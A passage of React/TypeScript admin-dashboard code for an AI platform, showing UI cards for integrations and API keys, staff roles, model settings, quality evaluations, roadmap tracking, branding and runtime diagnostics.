          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, strictLiveness: !p.strictLiveness }))}>
            Liveness: {idverseConfig.strictLiveness ? "strict" : "relaxed"}
          </button>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveIdverseConfig}>Save IDVerse Config</button>
          <button style={chip} onClick={checkIdverseStatus}>Check Status</button>
          <button style={chip} onClick={runIdverseVerifySample}>Run Verify Sample</button>
        </div>
        {idverseStatus && (
          <div style={log}>
            <pre style={{ margin: 0, whiteSpace: "pre-wrap" }}>{JSON.stringify(idverseStatus, null, 2)}</pre>
          </div>
        )}
      </Card>
      <Card title="Integrations & API Platform (Founder Premium)">
        <div style={{ ...muted, marginBottom: 8 }}>
          Connector/MCP-ready integration hub for external apps and enterprise workflows.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 8 }}>
          <button style={chip} onClick={() => createConnectorPreset("github")}>+ GitHub Connector</button>
          <button style={chip} onClick={() => createConnectorPreset("google_drive")}>+ Google Drive Connector</button>
          <button style={chip} onClick={() => createConnectorPreset("slack")}>+ Slack Connector</button>
          <button style={chip} onClick={() => createConnectorPreset("notion")}>+ Notion Connector</button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, connectorsEnabled: !p.connectorsEnabled }))}>
            MCP/Connectors: {marketReadinessConfig.connectorsEnabled ? "enabled" : "disabled"}
          </button>
        </div>
        <div style={{ display: "grid", gap: 8 }}>
          <input
            value={integrationDraft.appName}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, appName: e.target.value }))}
            placeholder="App name (e.g. afyalink)"
            style={input}
          />
          <textarea
            value={integrationDraft.appDescription}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, appDescription: e.target.value }))}
            placeholder="App details / what it needs from NeuroEdge"
            style={{ ...input, minHeight: 70 }}
          />
          <div style={{ display: "flex", gap: 8 }}>
            <select
              value={integrationDraft.environment}
              onChange={(e) => setIntegrationDraft((p) => ({ ...p, environment: e.target.value as IntegrationApp["environment"] }))}
              style={input}
            >
              <option value="development">development</option>
              <option value="staging">staging</option>
              <option value="production">production</option>
            </select>
            <input
              value={integrationDraft.rateLimitPerMin}
              onChange={(e) => setIntegrationDraft((p) => ({ ...p, rateLimitPerMin: e.target.value }))}
              placeholder="Rate limit/min"
              style={input}
            />
          </div>
          <input
            value={integrationDraft.scopesCsv}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, scopesCsv: e.target.value }))}
            placeholder="Scopes (comma-separated): chat:write, ai:infer, execute:run"
            style={input}
          />
          <input
            value={integrationDraft.originsCsv}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, originsCsv: e.target.value }))}
            placeholder="Allowed origins (comma-separated)"
            style={input}
          />
          <input
            value={integrationDraft.webhookUrl}
            onChange={(e) => setIntegrationDraft((p) => ({ ...p, webhookUrl: e.target.value }))}
            placeholder="Webhook URL"
            style={input}
          />
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={createIntegration}>Create Integration + Key</button>
          <button style={chip} onClick={requestPaidIntegrationKey}>Request Paid User Key</button>
        </div>
        {!!latestGeneratedApiKey && (
          <div style={log}>
            <div style={{ marginBottom: 6 }}>Generated API Key</div>
            <code style={{ fontSize: "0.78rem", wordBreak: "break-all" }}>{latestGeneratedApiKey}</code>
            <div style={{ marginTop: 8 }}>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(latestGeneratedApiKey)}>Copy API Key</button>
            </div>
          </div>
        )}
        <div style={{ display: "grid", gap: 8 }}>
          {integrations.map((it) => (
            <div key={it.id} style={log}>
              <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
                <strong>{it.appName}</strong>
                <span>{it.environment} • {it.status}</span>
              </div>
              <div style={{ marginTop: 4, color: "#94a3b8" }}>{it.appDescription || "No description."}</div>
              <div style={{ marginTop: 4 }}>Scopes: {(it.scopes || []).join(", ") || "-"}</div>
              <div>Key: {it.keyMasked || (it.apiKey ? `${it.apiKey.slice(0, 6)}...${it.apiKey.slice(-4)}` : "not set")}</div>
              <div style={{ marginTop: 8, display: "flex", gap: 6, flexWrap: "wrap" }}>
                {it.apiKey && (
                  <button style={chip} onClick={() => navigator.clipboard?.writeText(it.apiKey || "")}>Copy Key</button>
                )}
                <button
                  style={chip}
                  onClick={() =>
                    callAction("/admin/dashboard/integrations/upsert", {
                      integration: {
                        ...it,
                        status: it.status === "active" ? "paused" : "active",
                      },
                    })
                  }
                >
                  {it.status === "active" ? "Pause" : "Activate"}
                </button>
                <button
                  style={chip}
                  onClick={() =>
                    runGuarded(`integration ${it.appName}`, () => callAction("/admin/dashboard/integrations/delete", { id: it.id }), "delete")
                  }
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
          {integrations.length === 0 && <div style={muted}>No integrations yet. Create your first app connection.</div>}
        </div>
      </Card>
      <Card title="Role Governance">
        <div style={log}>
          <div style={{ fontWeight: 700, marginBottom: 8 }}>Founder Staff Registration (GoldegeLabs devices only)</div>
          <div style={{ display: "grid", gap: 8 }}>
            <input value={staffName} onChange={(e) => setStaffName(e.target.value)} placeholder="Staff full name" style={input} />
            <input value={staffEmail} onChange={(e) => setStaffEmail(e.target.value)} placeholder="Staff email" style={input} />
            <div style={{ display: "flex", gap: 8 }}>
              <select value={staffRole} onChange={(e) => setStaffRole(e.target.value as "admin" | "developer")} style={input}>
                <option value="admin">admin</option>
                <option value="developer">developer</option>
              </select>
              <input
                value={staffDeviceId}
                onChange={(e) => setStaffDeviceId(e.target.value)}
                placeholder={`Device ID (leave blank to auto-use ${localDeviceId()})`}
                style={input}
              />
            </div>
            <button style={primary} onClick={registerStaffUser}>Register Staff + Bind Device</button>
          </div>
        </div>
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>
              {u.name} ({u.role}) • {u.status}
              {u.founderRegistered ? " • founder-registered" : ""}
              {u.companyOwnedOnly ? " • company-device-only" : ""}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <select value={u.role} onChange={(e) => assignRole(u.id, e.target.value as UserRecord["role"])} style={{ ...input, width: 130 }}>
                <option value="user">user</option>
                <option value="moderator">moderator</option>
                <option value="admin">admin</option>
                <option value="developer">developer</option>
                <option value="founder">founder</option>
              </select>
              <button style={chip} onClick={() => setStaffAccess(u.id, "allow")}>Allow</button>
              <button style={chip} onClick={() => setStaffAccess(u.id, "suspend")}>Suspend</button>
              <button style={chip} onClick={() => setStaffAccess(u.id, "revoke")}>Revoke</button>
              <button style={chip} onClick={() => bindStaffDevice(u.id, localDeviceId())}>Bind This Device</button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Model Control">
        <select value={modelControl.model} onChange={(e) => setModelControl((p) => ({ ...p, model: e.target.value }))} style={input}>
          <option value="neuroedge-7b-instruct">neuroedge-7b-instruct</option>
          <option value="neuroedge-13b-instruct">neuroedge-13b-instruct</option>
          <option value="neuroedge-70b-router">neuroedge-70b-router</option>
        </select>
        <input type="number" value={modelControl.temperature} onChange={(e) => setModelControl((p) => ({ ...p, temperature: Number(e.target.value) || 0 }))} style={input} />
        <input type="number" value={modelControl.maxTokens} onChange={(e) => setModelControl((p) => ({ ...p, maxTokens: Number(e.target.value) || 1024 }))} style={input} />
        <select value={modelControl.safetyMode} onChange={(e) => setModelControl((p) => ({ ...p, safetyMode: e.target.value as ModelControl["safetyMode"] }))} style={input}>
          <option value="strict">strict</option>
          <option value="balanced">balanced</option>
          <option value="open">open</option>
        </select>
        <button style={primary} onClick={saveModelControl}>Save Model Control</button>
      </Card>
      <Card title="Feature Flags">
        {Object.keys(featureFlags).map((k) => (
          <div key={k} style={row}>
            <span>{k}</span>
            <button style={chip} onClick={() => toggleFlag(k)}>
              {featureFlags[k] ? "Enabled" : "Disabled"}
            </button>
          </div>
        ))}
      </Card>
      <Card title="Quality Command Center (Founder/Admin)">
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={runQualityHardening}>Run Full Hardening</button>
          <button style={chip} onClick={runQualityBatch}>Run Eval Batch</button>
          <button style={chip} onClick={runQualityRedTeam}>Run Red-Team</button>
          <button style={chip} onClick={refreshQualityInsights}>Refresh Quality Signals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/trust/consistency?windowHours=72")}>Trust Consistency</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/trends?windowDays=30")}>Benchmark Trends</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/regression?windowDays=30")}>Regression Check</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/sre/concurrency")}>SRE Concurrency</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Eval Cases" value={String(qualityEvalCoverage?.totalCases || 0)} />
          <Stat label="Red-Team Cases" value={String(qualityEvalCoverage?.redTeamCases || 0)} />
          <Stat label="Reliability p95 (ms)" value={String(qualityReliability?.p95LatencyMs || 0)} />
          <Stat label="Success Rate" value={qualityReliability?.successRate !== undefined ? `${Number(qualityReliability.successRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Citation Coverage" value={qualityTrust?.citationCoverageRate !== undefined ? `${Number(qualityTrust.citationCoverageRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Hallucination Risk" value={qualityTrust?.hallucinationRiskScore !== undefined ? String(qualityTrust.hallucinationRiskScore) : "0"} />
          <Stat label="Stale Citation Rate" value={qualityRetrieval?.staleCitationRate !== undefined ? `${Number(qualityRetrieval.staleCitationRate * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Model Outcome Events" value={String(qualityModelSummary?.outcomes?.totalEvents || 0)} />
        </div>
        <div style={{ marginTop: 8, fontWeight: 700 }}>Model Router Variants</div>
        <textarea
          value={modelRouterDraft}
          onChange={(e) => setModelRouterDraft(e.target.value)}
          placeholder='[{"id":"neuroedge-7b-instruct","weight":70,"domains":["general"],"enabled":true}]'
          style={{ ...input, minHeight: 120, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveModelRouterFromDashboard}>Save Router</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/model-quality/summary")}>Open Model Summary JSON</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/evals/latest?limit=10")}>Latest Evals</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/redteam/latest?limit=10")}>Latest Red-Team</button>
        </div>
        <div style={{ marginTop: 8, fontWeight: 700 }}>Benchmark Baselines</div>
        <textarea
          value={benchmarkBaselinesDraft}
          onChange={(e) => setBenchmarkBaselinesDraft(e.target.value)}
          placeholder='[{"suite":"core","minAccuracy":0.82,"maxP95LatencyMs":2500}]'
          style={{ ...input, minHeight: 110, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveBenchmarkBaselinesFromDashboard}>Save Baselines</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/quality/benchmark/baselines")}>Load Baselines</button>
        </div>
      </Card>
      <Card title="Market Readiness Control Center (Founder/Admin)" wide>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveMarketReadiness}>Save Controls</button>
          <button style={chip} onClick={refreshMarketReadiness}>Refresh</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/market-readiness/summary")}>Open Summary JSON</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: 8, marginTop: 8 }}>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, verifiedAnswerMode: !p.verifiedAnswerMode }))}>
            Verified Answer Mode: {marketReadinessConfig.verifiedAnswerMode ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, trustUxByDefault: !p.trustUxByDefault }))}>
            Trust UX by Default: {marketReadinessConfig.trustUxByDefault ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, hitlRiskyActions: !p.hitlRiskyActions }))}>
            HITL Risky Actions: {marketReadinessConfig.hitlRiskyActions ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, deepResearchEnabled: !p.deepResearchEnabled }))}>
            Deep Research: {marketReadinessConfig.deepResearchEnabled ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, connectorsEnabled: !p.connectorsEnabled }))}>
            Connectors: {marketReadinessConfig.connectorsEnabled ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, artifactsWorkspaceEnabled: !p.artifactsWorkspaceEnabled }))}>
            Artifacts Workspace: {marketReadinessConfig.artifactsWorkspaceEnabled ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, reliabilityGuardrails: !p.reliabilityGuardrails }))}>
            Reliability Guardrails: {marketReadinessConfig.reliabilityGuardrails ? "on" : "off"}
          </button>
          <button style={chip} onClick={() => setMarketReadinessConfig((p) => ({ ...p, benchmarkReleaseGates: !p.benchmarkReleaseGates }))}>
            Benchmark Release Gates: {marketReadinessConfig.benchmarkReleaseGates ? "on" : "off"}
          </button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: 8, marginTop: 8 }}>
          <select
            value={marketReadinessConfig.hybridRoutingMode}
            onChange={(e) =>
              setMarketReadinessConfig((p) => ({
                ...p,
                hybridRoutingMode: e.target.value as MarketReadinessConfig["hybridRoutingMode"],
              }))
            }
            style={{ ...input, minWidth: 0 }}
          >
            <option value="balanced">hybrid routing: balanced</option>
            <option value="mesh_first">hybrid routing: mesh_first</option>
            <option value="local_first">hybrid routing: local_first</option>
          </select>
          <select
            value={marketReadinessConfig.domainPackStrictness}
            onChange={(e) =>
              setMarketReadinessConfig((p) => ({
                ...p,
                domainPackStrictness: e.target.value as MarketReadinessConfig["domainPackStrictness"],
              }))
            }
            style={{ ...input, minWidth: 0 }}
          >
            <option value="strict">domain packs: strict</option>
            <option value="standard">domain packs: standard</option>
          </select>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Readiness Score" value={marketReadinessSummary?.readinessScore !== undefined ? `${Number(marketReadinessSummary.readinessScore * 100).toFixed(1)}%` : "-"} />
          <Stat label="Trust Risk" value={marketReadinessSummary?.trust?.hallucinationRiskScore !== undefined ? String(marketReadinessSummary.trust.hallucinationRiskScore) : "-"} />
          <Stat label="Reliability" value={marketReadinessSummary?.reliability?.successRate !== undefined ? `${Number(marketReadinessSummary.reliability.successRate * 100).toFixed(1)}%` : "-"} />
          <Stat label="Stale Citations" value={marketReadinessSummary?.retrieval?.staleCitationRate !== undefined ? `${Number(marketReadinessSummary.retrieval.staleCitationRate * 100).toFixed(1)}%` : "-"} />
        </div>
      </Card>
      <Card title="Frontier Program Roadmap (Founder/Admin)" wide>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={refreshFrontierProgram}>Refresh Program</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/frontier-program/readiness")}>Open Readiness JSON</button>
          <button style={chip} onClick={() => runBackendAction("GET:/admin/frontier-program")}>Open Program JSON</button>
          <button style={chip} onClick={resetFrontierProgramFromDashboard}>Reset Program</button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Readiness Gate" value={frontierReadiness?.gate ? "pass" : "hold"} />
          <Stat label="Readiness Score" value={frontierReadiness?.readinessScore !== undefined ? `${Number(frontierReadiness.readinessScore * 100).toFixed(1)}%` : "0%"} />
          <Stat label="Blocked Items" value={String(frontierReadiness?.totals?.blocked || 0)} />
          <Stat label="Total Items" value={String(frontierReadiness?.totals?.items || frontierProgram?.items?.length || 0)} />
          <Stat label="Done Items" value={String(frontierReadiness?.totals?.done || 0)} />
          <Stat label="Critical Done" value={`${frontierReadiness?.totals?.criticalDone || 0}/${frontierReadiness?.totals?.criticalTotal || 0}`} />
        </div>
        <div style={{ marginTop: 8, fontSize: 13, opacity: 0.9 }}>
          {frontierReadiness?.recommendation || "Frontier readiness recommendation will appear here after refresh."}
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Update Single Item</div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8 }}>
          <input value={frontierItemId} onChange={(e) => setFrontierItemId(e.target.value)} placeholder="Item ID (model_core_01)" style={{ ...input, minWidth: 0 }} />
          <input value={frontierItemOwner} onChange={(e) => setFrontierItemOwner(e.target.value)} placeholder="Owner" style={{ ...input, minWidth: 0 }} />
          <select value={frontierItemStatus} onChange={(e) => setFrontierItemStatus(e.target.value as any)} style={{ ...input, minWidth: 0 }}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
          <select value={frontierItemPriority} onChange={(e) => setFrontierItemPriority(e.target.value as any)} style={{ ...input, minWidth: 0 }}>
            <option value="critical">critical</option>
            <option value="high">high</option>
            <option value="medium">medium</option>
            <option value="low">low</option>
          </select>
          <input value={frontierItemNotes} onChange={(e) => setFrontierItemNotes(e.target.value)} placeholder="Notes" style={{ ...input, gridColumn: "span 2", minWidth: 0 }} />
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
          <button style={primary} onClick={upsertFrontierItemFromDashboard}>Save Item</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Bulk Item Update</div>
        <textarea
          value={frontierBulkIds}
          onChange={(e) => setFrontierBulkIds(e.target.value)}
          placeholder={"Item IDs (comma/newline separated)\nmodel_core_01\neval_03\nsre_02"}
          style={{ ...input, minHeight: 72 }}
        />
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8 }}>
          <select value={frontierBulkStatus} onChange={(e) => setFrontierBulkStatus(e.target.value as any)} style={{ ...input, minWidth: 0 }}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
          <button style={chip} onClick={bulkUpdateFrontierItemsFromDashboard}>Apply Bulk Update</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Milestones</div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8 }}>
          <input value={frontierMilestoneId} onChange={(e) => setFrontierMilestoneId(e.target.value)} placeholder="Milestone ID" style={{ ...input, minWidth: 0 }} />
          <input value={frontierMilestoneName} onChange={(e) => setFrontierMilestoneName(e.target.value)} placeholder="Milestone Name" style={{ ...input, minWidth: 0 }} />
          <input value={frontierMilestoneQuarter} onChange={(e) => setFrontierMilestoneQuarter(e.target.value)} placeholder="Quarter (Q2-2026)" style={{ ...input, minWidth: 0 }} />
          <input value={frontierMilestoneOwner} onChange={(e) => setFrontierMilestoneOwner(e.target.value)} placeholder="Owner" style={{ ...input, minWidth: 0 }} />
          <select value={frontierMilestoneStatus} onChange={(e) => setFrontierMilestoneStatus(e.target.value as any)} style={{ ...input, minWidth: 0 }}>
            <option value="planned">planned</option>
            <option value="in_progress">in_progress</option>
            <option value="blocked">blocked</option>
            <option value="done">done</option>
          </select>
        </div>
        <textarea
          value={frontierMilestoneCriteria}
          onChange={(e) => setFrontierMilestoneCriteria(e.target.value)}
          placeholder={"Success criteria (one per line)\nNightly eval active\nRegression gate passing"}
          style={{ ...input, minHeight: 72 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
          <button style={chip} onClick={upsertFrontierMilestoneFromDashboard}>Save Milestone</button>
        </div>

        <div style={{ marginTop: 10, fontWeight: 700 }}>Roadmap Snapshot</div>
        <div style={{ display: "grid", gap: 6, maxHeight: 220, overflowY: "auto", paddingRight: 4 }}>
          {(frontierProgram?.items || []).slice(0, 24).map((item) => (
            <div key={item.id} style={{ ...row, alignItems: "flex-start", border: "1px solid rgba(148,163,184,0.25)", borderRadius: 8, padding: 8 }}>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700 }}>{item.id} • {item.title}</div>
                <div style={{ fontSize: 12, opacity: 0.85 }}>{item.group} • {item.priority} • {item.status} • {item.targetQuarter} • {item.owner}</div>
              </div>
              <button
                style={chip}
                onClick={async () => {
                  setFrontierItemId(item.id);
                  setFrontierItemOwner(item.owner || "founder");
                  setFrontierItemPriority((item.priority as any) || "high");
                  setFrontierItemStatus((item.status as any) || "planned");
                  setFrontierItemNotes(item.notes || "");
                }}
              >
                Edit
              </button>
            </div>
          ))}
          {(!frontierProgram || (frontierProgram.items || []).length === 0) && (
            <div style={{ opacity: 0.8 }}>No frontier items loaded yet.</div>
          )}
        </div>
      </Card>
      <Card title="Branding Studio (Founder/System Admin)">
        <input
          value={brandingDraft.productName}
          onChange={(e) => setBrandingDraft((p) => ({ ...p, productName: e.target.value }))}
          placeholder="Product name"
          style={input}
        />
        <div style={{ display: "grid", gap: 8 }}>
          <div style={row}>
            <span>Logo</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("logoUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Icon</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("iconUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Favicon</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("faviconUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Main Chat Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("mainChatBackgroundUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Floating Chat Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("floatingChatBackgroundUrl", e.target.files)} />
            </label>
          </div>
          <div style={row}>
            <span>Login Background</span>
            <label style={chip}>
              Upload
              <input type="file" accept="image/*" style={{ display: "none" }} onChange={(e) => onBrandAssetUpload("loginBackgroundUrl", e.target.files)} />
            </label>
          </div>
        </div>
        <div style={{ display: "flex", gap: 10, alignItems: "center", flexWrap: "wrap" }}>
          <img src={brandingDraft.logoUrl || defaultBranding.logoUrl} alt="logo preview" style={{ width: 56, height: 56, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.iconUrl || defaultBranding.iconUrl} alt="icon preview" style={{ width: 32, height: 32, objectFit: "cover", borderRadius: 6, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.faviconUrl || defaultBranding.faviconUrl} alt="favicon preview" style={{ width: 20, height: 20, objectFit: "cover", borderRadius: 4, border: "1px solid rgba(148,163,184,0.35)" }} />
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(120px, 1fr))", gap: 8 }}>
          <img src={brandingDraft.mainChatBackgroundUrl || defaultBranding.logoUrl} alt="main chat bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.floatingChatBackgroundUrl || defaultBranding.logoUrl} alt="floating bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
          <img src={brandingDraft.loginBackgroundUrl || defaultBranding.logoUrl} alt="login bg preview" style={{ width: "100%", height: 78, objectFit: "cover", borderRadius: 8, border: "1px solid rgba(148,163,184,0.35)" }} />
        </div>
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Main chat overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.mainChatOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, mainChatOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Floating overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.floatingOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, floatingOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Login overlay opacity</span>
            <input
              type="range"
              min={0.2}
              max={1}
              step={0.02}
              value={brandingDraft.loginOverlayOpacity}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, loginOverlayOpacity: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Accent color</span>
            <input
              type="color"
              value={brandingDraft.accentColor || "#2563eb"}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, accentColor: e.target.value }))}
              style={{ width: 64, height: 30, padding: 0, border: "none", background: "transparent" }}
            />
          </div>
          <div style={{ ...row, alignItems: "center" }}>
            <span>Glass blur</span>
            <input
              type="range"
              min={0}
              max={24}
              step={1}
              value={brandingDraft.glassBlur}
              onChange={(e) => setBrandingDraft((p) => ({ ...p, glassBlur: Number(e.target.value) }))}
              style={{ width: 180 }}
            />
          </div>
        </div>
        <div style={{ ...log, whiteSpace: "pre-wrap" }}>
          Future options: custom fonts, animated gradients, per-workspace themes, scheduled themes, campaign branding, locale-based branding.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={saveBrandingSettings}>Save Branding</button>
          <button
            style={chip}
            onClick={() => {
              setBrandingDraft(defaultBranding);
              saveBranding(defaultBranding);
              addNotification({ type: "info", message: "Branding reset to defaults." });
            }}
          >
            Reset Default
          </button>
        </div>
      </Card>
      <Card title="System Health & Security">
        <Stat label="Uptime" value={`${adminMetrics?.uptimeSec || 0}s`} />
        <Stat label="Heap Used" value={formatBytes(adminMetrics?.memory?.heapUsed || 0)} />
        <Stat label="Security Alerts" value={String(securityAlerts.length)} />
        <button style={chip} onClick={() => exportData("security_alerts", securityAlerts)}>Export Alerts</button>
      </Card>
      <Card title="Operations Control">
        <div style={row}>
          <span>Restart Kernel</span>
          <button style={chip} onClick={() => requestServiceRestart("kernel")}>Request</button>
        </div>
        <div style={row}>
          <span>Restart ML</span>
          <button style={chip} onClick={() => requestServiceRestart("ml")}>Request</button>
        </div>
        <div style={row}>
          <span>Restart Orchestrator</span>
          <button style={chip} onClick={() => requestServiceRestart("orchestrator")}>Request</button>
        </div>
      </Card>
      <Card title="Runtime Debug Matrix (Founder/Admin)" wide>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          {([
            ["kernel", `Kernel (${runtimeCounts.kernel})`],
            ["ml", `ML (${runtimeCounts.ml})`],
            ["orchestrator", `Orchestrator (${runtimeCounts.orchestrator})`],
            ["frontend", `Frontend modules (${runtimeCounts.frontend})`],
          ] as Array<[RuntimeDomain, string]>).map(([key, label]) => (
            <button
              key={key}
              style={{
                ...(runtimeDomain === key ? primary : chip),
                minWidth: 170,
              }}
              onClick={() => setRuntimeDomain(key)}
            >
              {label}
            </button>
          ))}
          <button style={chip} onClick={loadRuntimeInventory}>
            {runtimeScanLoading ? "Scanning..." : "Scan Runtime (Twin)"}
          </button>
          <button style={chip} onClick={() => runRuntimeDiagnostics(runtimeDomain)}>Run Diagnostics</button>
          <button style={chip} onClick={() => runRuntimeAutoFix(runtimeDomain)}>Auto Fix / Restart</button>
          <button
            style={chip}
            onClick={() =>
              runBackendAction("/self-expansion/propose", {
                goal: `expand and harden ${runtimeDomain} runtime modules`,
              })
            }
          >
            Expand Code
          </button>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(120px, 1fr))", gap: 8, marginTop: 8 }}>
          <Stat label="Registered" value={String(runtimeSummary.registered)} />
          <Stat label="Live" value={String(runtimeSummary.live)} />
          <Stat label="Offline" value={String(runtimeSummary.offline)} />
          <Stat label="Service State" value={runtimeServiceState[runtimeDomain]} />
        </div>
        <div style={{ marginTop: 6, fontSize: 12, opacity: 0.85 }}>
          Source: backend live status + twin code scan. Last runtime scan:{" "}
          {runtimeScanAt ? new Date(runtimeScanAt).toLocaleString() : "not yet"}
        </div>
        <div style={{ marginTop: 8, maxHeight: 320, overflowY: "auto", overflowX: "hidden", display: "grid", gap: 6, paddingRight: 4 }}>
          {(runtimeUnits[runtimeDomain] || []).map((unit) => (
            <button
              key={unit.id}
              style={{
                ...log,
                textAlign: "left",
                width: "100%",
                minWidth: 0,
                whiteSpace: "normal",
                overflowWrap: "anywhere",
                wordBreak: "break-word",
                border:
                  selectedRuntimeUnit?.id === unit.id
                    ? "1px solid rgba(59,130,246,0.85)"
                    : "1px solid rgba(148,163,184,0.22)",
                cursor: "pointer",
                background: unit.live ? "rgba(15,23,42,0.72)" : "rgba(127,29,29,0.25)",
              }}
              onClick={() => inspectRuntimeUnit(unit)}
            >
